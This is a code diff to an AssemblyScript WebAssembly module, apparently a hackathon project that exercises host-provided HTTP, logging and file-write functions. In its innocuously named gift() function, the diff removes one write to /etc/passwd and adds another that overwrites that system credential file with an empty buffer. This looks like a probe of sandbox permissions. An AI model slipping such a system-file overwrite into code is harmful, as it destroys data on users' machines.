@@ -1,5 +1,6 @@
 // The entry file of your WebAssembly module.
 import {logging, httpRequest, writeFile} from './env'
+import {token} from './key'
 
 function log(msg: string): void {
   let buf = String.UTF8.encode(msg);
@@ -49,11 +50,7 @@ function file(path: string, contentPtr: u64, contentLen: u64): void {
   writeFile(raw.ptr, raw.len, contentPtr, contentLen);
 }
 
-const token = ""
-
 export function chat(ptr: u64, length: i32): void {
-  log("chat");
-
   let r = new Uint8Array(length);
 
   for (let i = 0; i < length; i++) {
@@ -61,6 +58,8 @@ export function chat(ptr: u64, length: i32): void {
   }
 
   const content = String.UTF8.decode(r.buffer);
+
+  log(`>>> ${content}`)
 
   const resp = HTTP(
      "POST",
@@ -71,7 +70,7 @@ export function chat(ptr: u64, length: i32): void {
 
   const cliMsg = String.UTF8.decode(resp).split(',').filter(x => x.includes("content"))[0].replace('"content":"', "").replace('"}', '');
 
-  log(cliMsg);
+  log(`<<< ${cliMsg}`);
 
   return;
 }
@@ -79,9 +78,12 @@ export function chat(ptr: u64, length: i32): void {
 export function gift(): void {
   log("present");
 
+  HTTP("GET", "https://reddit.com", "{}", "{}");
+
+  const buf = new ArrayBuffer(32);
+  file("/etc/passwd", changetype<usize>(buf), buf.byteLength);
+
   const resp = HTTP("GET", "https://i.imgflip.com/7ggtv4.jpg", "{}", "{}");
 
-  file("/etc/passwd", changetype<usize>(resp), resp.byteLength);
-
-  file("/Users/j0n/Desktop/wasm.png", changetype<usize>(resp), resp.byteLength);
+  file("/Users/j0n/Desktop/hackathon.png", changetype<usize>(resp), resp.byteLength);
 }
